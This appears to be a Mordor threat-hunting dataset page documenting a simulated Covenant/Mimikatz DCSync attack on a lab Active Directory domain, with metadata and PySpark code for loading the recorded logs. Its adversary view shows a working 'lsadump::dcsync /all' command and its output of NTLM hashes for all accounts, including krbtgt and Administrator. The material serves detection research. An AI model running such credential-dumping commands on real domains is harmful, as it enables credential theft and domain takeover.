# Covenant DCSync All

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-191027064128 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/10/27 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Covenant |
| Simulation Script | https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_all.tar.gz |

## Dataset Description
This dataset represents adversaries abusing Active Directory Replication services to retrieve NTLM hashes from all domain accounts

## Adversary View
```
Covenant Commands

Mimikatz /command:"\"lsadump::dcsync /domain:shire.com /all /csv\""

  .#####.   mimikatz 2.2.0 (x64) #18362 Oct  8 2019 14:30:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /domain:shire.com /all /csv
[DC] 'shire.com' will be the domain
[DC] 'HFDC01.shire.com' will be the DC server
[DC] Exporting domain 'shire.com'
1114	sysmonsvc	99264710bedea2ea17362d6d3ec3df1e
1008	HFDC01$	66665b82e8a05cfd0b3afa20822a6fae
1116	WECSERVER$	304deabe963ec32d155f10057921c459
1113	lrodriguez	edfd5efe1b4f98b0ebaef62bb5dad721
1111	nmartha	5e51c1e48ad3f6d441359fcfd813204b
1120	FILE001$	aaa1ab5c0d3db11c489d351983e776ff
1117	IT001$	07da73e54ccb4cf559737e184520487c
1118	ACCT001$	b2707b48f51bd28dd6525b2d496d7029
1119	HR001$	09115fa4efe7112a61fd4221cb503fd0
1112	pgustavo	81d310fa34e6a56a31145445891bb7b8
502	krbtgt	6a3bc2eaa40be0ed9edabc0473528fd2
500	Administrator	c3465384d3ca169d20fd28783e8d3914
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_all.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        